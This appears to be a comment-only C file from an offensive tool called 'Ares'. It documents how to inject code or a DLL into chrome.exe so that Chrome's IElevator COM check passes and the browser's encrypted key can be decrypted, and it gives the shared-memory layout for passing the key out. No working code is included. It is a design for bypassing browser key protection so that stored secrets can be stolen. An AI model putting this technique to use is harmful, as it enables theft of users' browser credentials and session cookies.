/* Ares — IElevator Shellcode v2
 * 
 * Injected into chrome.exe via NtCreateThreadEx
 * Calls IElevator COM from chrome.exe context
 * 
 * This is POSITION-INDEPENDENT C code compiled as shellcode-like.
 * The key difference from v1: we call IElevator from inside chrome.exe
 * which passes the path validation check.
 *
 * Shared memory layout:
 *   [0x00] DWORD magic       — 0xDE4DC0DE = ready, 0xC0FFEE42 = success  
 *   [0x04] DWORD enc_len     — length of encrypted blob
 *   [0x08] BYTE  enc[4096]   — encrypted_key blob (without DPAPI prefix)
 *   [0x1008] DWORD dec_len   — length of decrypted key
 *   [0x100C] BYTE  dec[256]  — decrypted key output
 *   [0x110C] DWORD error     — HRESULT error code
 *
 * Instead of PIC assembly, we use a DLL injected via LoadLibrary
 * that's loaded in chrome.exe context → IElevator path check passes
 */

/* This file documents the approach. Actual implementation uses
 * the DLL-based approach in elevator_inject_dll.c */
